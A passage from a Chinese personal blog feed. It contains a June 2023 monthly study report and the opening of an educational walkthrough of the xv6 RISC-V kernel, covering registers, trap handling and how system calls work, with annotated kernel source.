    <content type="html"><![CDATA[<p>学习的六月</p><span id="more"></span><h2 id="Week-9-2023-06-01-2023-06-04"><a href="#Week-9-2023-06-01-2023-06-04" class="headerlink" title="Week 9 (2023.06.01 - 2023.06.04)"></a>Week 9 (2023.06.01 - 2023.06.04)</h2><p>本来想着看 xv6 的视频，结果看着看着，跑去看线程切换的源码了，算是基本搞懂了原理</p><p>把计网和通原实验做完了，还挺有意思（笑）</p><p>🏓 75 分，略低 😰</p><p>下周期望</p><ul><li>完成内容安全和智能终端安全作业</li><li>开始预习</li></ul><h2 id="Week-10-2023-06-05-2023-06-11"><a href="#Week-10-2023-06-05-2023-06-11" class="headerlink" title="Week 10 (2023.06.05 - 2023.06.11)"></a>Week 10 (2023.06.05 - 2023.06.11)</h2><p>和 Jam 复习协议和软件，Jam 好强</p><h2 id="Week-11-2023-06-12-2023-06-18"><a href="#Week-11-2023-06-12-2023-06-18" class="headerlink" title="Week 11 (2023.06.12 - 2023.06.18)"></a>Week 11 (2023.06.12 - 2023.06.18)</h2><p>考完协议和软件了捏</p><p>这 b AI 实验我是一辈子不想再做了（<del>什么 b 课都来蹭 AI，笑</del>）</p><p>换手机了，芜湖</p><h2 id="Week-12-2023-06-19-2023-06-25"><a href="#Week-12-2023-06-19-2023-06-25" class="headerlink" title="Week 12 (2023.06.19 - 2023.06.25)"></a>Week 12 (2023.06.19 - 2023.06.25)</h2><p>人工智能复习半小时，考试半小时（乐）</p><p>出去和对象玩耍，拍了好多照片，好好看🥰</p><h2 id="Week-13-2023-06-26-2023-06-30"><a href="#Week-13-2023-06-26-2023-06-30" class="headerlink" title="Week 13 (2023.06.26 - 2023.06.30)"></a>Week 13 (2023.06.26 - 2023.06.30)</h2><p>回高中看望班主任，聊了很多，开心捏</p><p>去❀上班了！</p><ul><li>入职：好激动</li><li>上班第一天：什么时候下班</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>考试搞定了</li><li>实习有着落了</li><li>高中毕业以来第一次去看老师</li></ul><h2 id="期望"><a href="#期望" class="headerlink" title="期望"></a>期望</h2><ul><li>实习好好干，多学容器安全</li><li>xv6 继续看，剖析类 Unix 内核源码（进阶：Linux 内核源码）</li><li>身体健康最重要，早睡早起</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;学习的六月&lt;/p&gt;</summary>
    
    
    
    <category term="Month Report" scheme="https://humoooor.cn/categories/Month-Report/"/>
    
    
  </entry>
  
  <entry>
    <title>Xv6 剖析</title>
    <link href="https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/"/>
    <id>https://humoooor.cn/2023/05/23/Xv6%20%E5%89%96%E6%9E%90/</id>
    <published>2023-05-23T03:21:00.000Z</published>
    <updated>2024-01-04T04:30:18.394Z</updated>
    
    <content type="html"><![CDATA[<p>个人对 xv6 这个简易操作系统内核比较感兴趣，就想写一个剖析，看看 xv6 都是怎么实现这些功能的，坚持一周更一个话题</p><span id="more"></span><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>可以直接读下面的话题，这里是便于读此文章时快速了解</p><h3 id="关于-xv6"><a href="#关于-xv6" class="headerlink" title="关于 xv6"></a>关于 xv6</h3><p>xv6 是一个基于 RISC-V 64 位架构 CPU 的类 Unix 简易操作系统</p><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><table><thead><tr><th>Register</th><th>ABI Name</th><th>Description</th><th>Saver</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>Hard-wired zero</td><td>-</td></tr><tr><td>x1</td><td>ra</td><td>Return address</td><td>Caller</td></tr><tr><td>x2</td><td>sp</td><td>Stack pointer</td><td>Callee</td></tr><tr><td>x3</td><td>gp</td><td>Global pointer</td><td>-</td></tr><tr><td>x4</td><td>tp</td><td>Thread pointer</td><td>-</td></tr><tr><td>x5-7</td><td>t0-2</td><td>Temporaries</td><td>Caller</td></tr><tr><td>x8</td><td>s0/fp</td><td>Saved register / frame pointer</td><td>Callee</td></tr><tr><td>x9</td><td>s1</td><td>Saved register</td><td>Callee</td></tr><tr><td>x10-x11</td><td>a0-1</td><td>Function arguments / return values</td><td>Caller</td></tr><tr><td>x12-x17</td><td>a2-7</td><td>Function arguments</td><td>Caller</td></tr><tr><td>x18-27</td><td>s2-11</td><td>Saved registers</td><td>Callee</td></tr><tr><td>x28-31</td><td>t3-6</td><td>Temporaries</td><td>Caller</td></tr></tbody></table><p>在汇编中一般使用寄存器的 ABI 名字</p><p>还有 f 开头的寄存器，用于浮点数，没有列举出来</p><p>ra 保存当前函数的返回地址</p><p>s0/fp、sp 用于保存栈底和栈顶，注意 s0 和 fp 是同一个寄存器</p><p>tp 保存当前 CPU 核 id</p><p>a0 还用于保存函数返回值</p><ul><li>Saver<ul><li>函数之间除了 a0 寄存器传递返回值外，应该不能互相影响，因此其他寄存器需要被保存下来，Saver 指定当前函数的寄存器是由调用函数还是被调用函数保存</li><li>Caller：调用函数<ul><li>Caller 在函数开始就可以选择 Caller 类寄存器保存下来，一般只保存 ra，具体由编译器选择</li></ul></li><li>Callee：被调用函数<ul><li>Callee 只保存它会用到的 Callee 类寄存器，在返回到 Caller 前恢复</li></ul></li><li>为什么要分开保存呢？<ul><li>Callee 类的寄存器不能确定下层函数会不会用到，而且随时会变化，每次调用函数前后都存取一遍，性能会降低很多，为了提高性能，由被调用者来保存更加合适</li></ul></li></ul></li></ul><h4 id="控制状态寄存器"><a href="#控制状态寄存器" class="headerlink" title="控制状态寄存器"></a>控制状态寄存器</h4><p>CSR（Control Status Register）</p><ul><li>pc：指向下一条将要指向指令的地址<ul><li>Program Counter</li></ul></li><li>satp：保存一级页表的物理地址<ul><li>Supervisor Address Translation and Protection</li></ul></li><li>stvec：保存发生 trap 时跳转的地址<ul><li>Supervisor Trap Vector Base Address Register</li><li>用户模式下会指向 kernel/trapmpoline.S 的 <code>uservec</code></li><li>管理者模式下会指向 kernel/kernelvec.S 的 <code>kernelvec</code></li></ul></li><li>sepc：保存发生 trap 时 pc 的值，便于返回到用户进程<ul><li>Supervisor Exception Program Counter</li><li>内核可控制 sepc 让 sret 返回到适当的位置</li></ul></li><li>scause：记录发生 trap 的原因，内核根据这个做进一步处理<ul><li>Supervisor Cause Register</li><li>8 表示系统调用</li><li>其他表示错误或者中断</li></ul></li><li>sstatus：以 bitmap 形式保存一些控制信息<ul><li>Supervisor Status Register</li><li>SPP：表示 trap 来自用户模式还是管理者模式，并用来告诉 sret 返回到哪个模式</li><li>SIE：表示在管理者模式下是否允许中断，0 表示禁止，RISC-V 会推迟硬件中断</li></ul></li><li>sscatch：在内核态与用户态时起辅助作用<ul><li>一般用来保存 a0</li><li><del>在 xv6 的 2020 版本用来保存 trapframe 地址</del></li></ul></li></ul><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><ul><li>csrr、csrw<ul><li>用于读写 CSR</li></ul></li><li>sfence.vma<ul><li>清空 TLB 缓存</li></ul></li><li>ecall（Environment Call）<ol><li>将模式从用户模式更改为管理者模式（sstatus 的 SPP 位）</li><li>将 pc 寄存器保存到 sepc 寄存器</li><li>将 pc 寄存器改为 stvec 寄存器值</li><li>关闭硬件中断（将 sstatus 的 SIE 位设为 0）</li></ol></li><li>sret（Supervisor Return）<ol><li>将模式从管理者模式更改为指定的模式（sstatus 的 SPP 位）</li><li>将 pc 寄存器改为 sepc 寄存器值</li><li>启用硬件中断（将 sstatus 的 SIE 位设为 1）</li></ol></li></ul><h3 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h3><ul><li>trampline：在内核页表和用户页表中都有映射，作为用户进程切换到内核的跳板，放在虚拟地址空间的顶部（0x3ffffff000），大小为一页</li><li>trapframe：在用户页表中有映射，用于切换到内核时保存用户进程的上下文，放在 trampoline 下面（0x3fffffe000），大小为一页</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight c"><figcaption><span>kernel/proc.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">proc</span>;</span>          <span class="comment">// The process running on this cpu, or null.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>     <span class="comment">// swtch() here to enter scheduler().</span></span><br><span class="line">  <span class="type">int</span> noff;                   <span class="comment">// Depth of push_off() nesting.</span></span><br><span class="line">  <span class="type">int</span> intena;                 <span class="comment">// Were interrupts enabled before push_off()?</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>proc<ul><li>保存当前 CPU 核运行的进程</li></ul></li><li>context<ul><li>保存内核用于调度功能的线程的上下文</li></ul></li></ul><h2 id="怎么在内核和用户进程间切换"><a href="#怎么在内核和用户进程间切换" class="headerlink" title="怎么在内核和用户进程间切换"></a>怎么在内核和用户进程间切换</h2><p>在 RISC-V 中，有三种 trap</p><ul><li>硬件中断</li><li>系统调用</li><li>异常</li></ul><p>后两个也称为软件中断</p><p>在用户进程中发生 trap 时，需要陷入到内核中进行处理，处理完后内核会根据情况回到用户进程或者杀死用户进程，这其中就涉及到内核和用户进程间的切换</p><h3 id="切换过程"><a href="#切换过程" class="headerlink" title="切换过程"></a>切换过程</h3><p>发生 trap 时，硬件会执行以下操作</p><ol><li>将 sstatus 中的 SIE 位清零，禁用硬件中断以防止干扰，如果这个 trap 是硬件中断，不会做以下操作</li><li>将模式从用户模式更改为管理者模式</li><li>将 pc 寄存器的值复制到 sepc 寄存器中</li><li>将当前模式（用户或者管理者）保存到 sstatus 寄存器的 SPP 位</li><li>设置 scause 寄存器的值反映 trap 原因</li><li>将 stvec 寄存器的值复制到 pc 寄存器中</li></ol><p>此时 pc 指向 trampoline，开始执行，注意，此时页表寄存器并没有便，也就是说还使用着用户进程的页表</p><figure class="highlight x86asm"><figcaption><span>kernel/trampoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.globl</span> uservec</span><br><span class="line"><span class="symbol">uservec:</span></span><br><span class="line">        # 缓存 a0</span><br><span class="line">        csrw sscratch, a0</span><br><span class="line"></span><br><span class="line">        # 把 trapframe 地址放到 a0 中</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        </span><br><span class="line">        # 把用户寄存器保存到 trapframe 中，kernel/proc<span class="number">.</span>h 中对应着变量地址</span><br><span class="line">        sd ra, <span class="number">40</span>(a0)</span><br><span class="line">        sd <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # 此处省略...</span><br><span class="line">        sd t5, <span class="number">272</span>(a0)</span><br><span class="line">        sd t6, <span class="number">280</span>(a0)</span><br><span class="line"></span><br><span class="line">    # 再把原 a0 的值保存进去</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, <span class="number">112</span>(a0)</span><br><span class="line"></span><br><span class="line">        # 从 trapframe 中取出内核栈的指针、<span class="meta">CPU</span> 核的 id、处理 trap 的地址、内核页表</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">8</span>(a0)</span><br><span class="line">        ld tp, <span class="number">32</span>(a0)</span><br><span class="line">        ld t0, <span class="number">16</span>(a0)</span><br><span class="line">        ld t1, <span class="number">0</span>(a0)</span><br><span class="line"></span><br><span class="line">        # 清空 TLB 缓存，这里英文注释是写等待之前的内存操作全部完全，不是很懂</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 切换到内核页表</span><br><span class="line">        csrw satp, t1</span><br><span class="line"></span><br><span class="line">        # 清空 TLB 缓存</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 跳转到处理 trap 的地方，也就是 kernel/trap<span class="number">.</span>c 的 usertrap 函数地址</span><br><span class="line">        jr t0</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>将用户进程的寄存器保存到 trapframe 中</li><li>切换内核栈，内核线程 id，内核页表</li><li>跳转到 kernel/trap.c 的 <code>usertrap</code> 函数</li></ol><p><code>uservec</code> 主要就是做好切换到内核的准备</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置 stvec 为 kernelvec，如果此时发生了 trap 会跳转到 kernelvec 进行处理</span></span><br><span class="line">  w_stvec((uint64)kernelvec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用 myproc 获取当前进程</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 保存用户进程的 pc 到 trapframe</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = r_sepc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据发生 trap 的原因处理 trap</span></span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="comment">// 系统调用</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>((which_dev = devintr()) != <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 硬件中断</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 其他异常</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果用户进程被杀死就退出</span></span><br><span class="line">  <span class="keyword">if</span>(killed(p))</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果是计时器中断，则进行进程调度</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  usertrapret();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>把 stvec 改成 kernelvec 以处理发生在内核的 trap</li><li>保存用户进程的 pc 到 trapframe</li><li>根据 scause、devintr 处理 trap</li><li>检查是否计时器中断，若是则进行进程调度</li><li>检查进程是否被杀死，若是则退出</li><li>跳转到 <code>usertrapret</code> 函数</li></ol><p><code>usertrap</code> 主要就是根据 trap 类型处理 trap</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrapret</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 关闭硬件中断，因为后面要切换 stvec 为 uservec，但是现在又在内核态，如果发生硬件中断会导致混乱</span></span><br><span class="line">  intr_off();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把 uservec 的地址写入 stvec 寄存器</span></span><br><span class="line">  uint64 trampoline_uservec = TRAMPOLINE + (uservec - trampoline);</span><br><span class="line">  w_stvec(trampoline_uservec);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存内核页表、内核栈、usertrap 地址、CPU 核 id</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_satp = r_satp();         <span class="comment">// kernel page table</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_sp = p-&gt;kstack + PGSIZE; <span class="comment">// process&#x27;s kernel stack</span></span><br><span class="line">  p-&gt;trapframe-&gt;kernel_trap = (uint64)usertrap;</span><br><span class="line">  p-&gt;trapframe-&gt;kernel_hartid = r_tp();         <span class="comment">// hartid for cpuid()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// set up the registers that trampoline.S&#x27;s sret will use</span></span><br><span class="line">  <span class="comment">// to get to user space.</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置 sstatus 寄存器</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_sstatus();</span><br><span class="line">  x &amp;= ~SSTATUS_SPP; <span class="comment">// SPP 位清零，以便 sret 返回到用户模式</span></span><br><span class="line">  x |= SSTATUS_SPIE; <span class="comment">// SPIE 位置 1，允许用户模式下硬件中断</span></span><br><span class="line">  w_sstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把用户进程的 pc 写入 sepc</span></span><br><span class="line">  w_sepc(p-&gt;trapframe-&gt;epc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出用户页表</span></span><br><span class="line">  uint64 satp = MAKE_SATP(p-&gt;pagetable);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 取出 userret 地址，准备调用，并传递用户页表进去</span></span><br><span class="line">  uint64 trampoline_userret = TRAMPOLINE + (userret - trampoline);</span><br><span class="line">  ((<span class="type">void</span> (*)(uint64))trampoline_userret)(satp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><ol><li>保存内核页表、内核栈、CPU 核的 id</li><li>配置 sstatus 寄存器</li><li>调用 <code>userret</code> 并传递用户页表</li></ol><p><code>usertrapret</code> 主要是处理 trap 后为返回到用户进程做准备</p><figure class="highlight x86asm"><figcaption><span>kernel/trampoline.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">globl userret</span><br><span class="line"><span class="symbol">userret:</span></span><br><span class="line">        # 转换到用户页表</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line">        csrw satp, a0</span><br><span class="line">        <span class="keyword">sfence</span><span class="number">.</span>vma <span class="meta">zero</span>, <span class="meta">zero</span></span><br><span class="line"></span><br><span class="line">        # 从 trapframe 中取出用户进程的寄存器值</span><br><span class="line">        li a0, TRAPFRAME</span><br><span class="line">        ld ra, <span class="number">40</span>(a0)</span><br><span class="line">        ld <span class="built_in">sp</span>, <span class="number">48</span>(a0)</span><br><span class="line">        # 此处省略...</span><br><span class="line">        ld t6, <span class="number">280</span>(a0)</span><br><span class="line">        ld a0, <span class="number">112</span>(a0)</span><br><span class="line">        </span><br><span class="line">        # 返回到用户模式和用户进程的 pc 所指位置</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure><p><code>userret</code> 主要是恢复用户进程的上下文，回到发生 trap 的位置（或者发生 trap 位置后面一个指令，比如 <code>ecall</code> 后面的指令）</p><h3 id="省流小结"><a href="#省流小结" class="headerlink" title="省流小结"></a>省流小结</h3><p><del>真省流吗？</del></p><p>用户进程 -&gt; <code>uservec</code> -&gt; <code>usertrap</code> -&gt; <code>usertrapret</code> -&gt; <code>userret</code> -&gt; 用户进程</p><ol><li>发生 trap 时，程序会跳转到 stvec 寄存器指向的 kernel/trampoline.S 中的 <code>uservec</code> 保存用户进程的上下文，并设置内核栈、内核线程 id、内核页表</li><li>然后跳转到 kernel/trap.c 中的 <code>usertrap</code> 对 trap 进行处理</li><li>如果要恢复到用户进程，会跳转到 kernel/trap.c 的 <code>usertrapret</code> 为返回到用户进程做准备</li><li>最后跳转到 kernel/trampoline.S 中的 <code>userret</code> 恢复用户进程上下文，回到发生 trap 的位置（或者发生 trap 位置后面一个指令，比如 <code>ecall</code> 后面的指令）</li></ol><h2 id="怎么实现系统调用"><a href="#怎么实现系统调用" class="headerlink" title="怎么实现系统调用"></a>怎么实现系统调用</h2><p>在 user/user.h 我们可以看到系统调用函数的声明</p><figure class="highlight c"><figcaption><span>user/user.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span>)</span> __<span class="title function_">attribute__</span><span class="params">((<span class="keyword">noreturn</span>))</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">wait</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pipe</span><span class="params">(<span class="type">int</span>*)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span>, <span class="type">const</span> <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span>, <span class="type">void</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>那么，就有一个问题，系统调用明明是要用 <code>ecall</code> 来使用，xv6 是怎么把系统调用做成一个函数，使得用户程序像调用函数那样调用系统调用？</p><h3 id="怎么制作用户系统调用函数"><a href="#怎么制作用户系统调用函数" class="headerlink" title="怎么制作用户系统调用函数"></a>怎么制作用户系统调用函数</h3><p>我们可以在 user/usys.S 看到系统调用函数在汇编中的定义</p><figure class="highlight x86asm"><figcaption><span>user/usys.S</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;kernel/syscall.h&quot;</span></span><br><span class="line"><span class="meta">.global</span> fork</span><br><span class="line"><span class="symbol">fork:</span></span><br><span class="line"> li a7, SYS_fork</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> exit</span><br><span class="line"><span class="symbol">exit:</span></span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"><span class="meta">.global</span> wait</span><br><span class="line"><span class="symbol">wait:</span></span><br><span class="line"> li a7, SYS_wait</span><br><span class="line"> ecall</span><br><span class="line"> <span class="keyword">ret</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以观察到，每一个系统调用函数都只是将系统调用号传递给 a7，然后使用 <code>ecall</code> 调用系统调用，最后返回到上一层函数</p><p>而参数传递是用户程序在调用系统调用函数之前，会根据函数声明将参数传递给对应的寄存器，然后跳转到系统调用函数的地址执行</p><p>这个 user/usys.S 文件其实是由一个 perl 脚本 user/usys.pl 生成的，便于添加系统调用</p><p>好的，上面解释了系统调用函数的实现，下面就看看 <code>ecall</code> 到底做了什么来请求内核完成系统调用</p><h3 id="怎么请求内核完成系统调用"><a href="#怎么请求内核完成系统调用" class="headerlink" title="怎么请求内核完成系统调用"></a>怎么请求内核完成系统调用</h3><p><code>ecall</code> 是由用户进程主动陷入 trap 请求内核完成系统调用的汇编指令</p><p>它会使 scause 寄存器值设为 8，在 RISC-V 中它代表着系统调用</p><p>在切换到内核态后，跳转到 kernel/trap.c 的 <code>usertrap</code></p><p>我们仔细看看 kernel/trap.c 的 <code>usertrap</code> 怎么处理系统调用的</p><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">usertrap</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当检查到 trap 原因是系统调用时</span></span><br><span class="line">  <span class="keyword">if</span>(r_scause() == <span class="number">8</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先检查用户进程是否被其他进程杀死</span></span><br><span class="line">    <span class="keyword">if</span>(killed(p))</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把 epc 加 4，ecall 指令占 4 字节，在恢复到用户进程时，跳转到 ecall 后面的指令</span></span><br><span class="line">    p-&gt;trapframe-&gt;epc += <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 启用硬件中断</span></span><br><span class="line">    intr_on();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始处理系统调用</span></span><br><span class="line">    syscall();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>usertrap</code> 检查到是系统调用时，将 epc 的值加 4，以便返回时执行 <code>ecall</code> 后面的指令，然后跳转到处理系统调用的函数 <code>syscall</code></p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 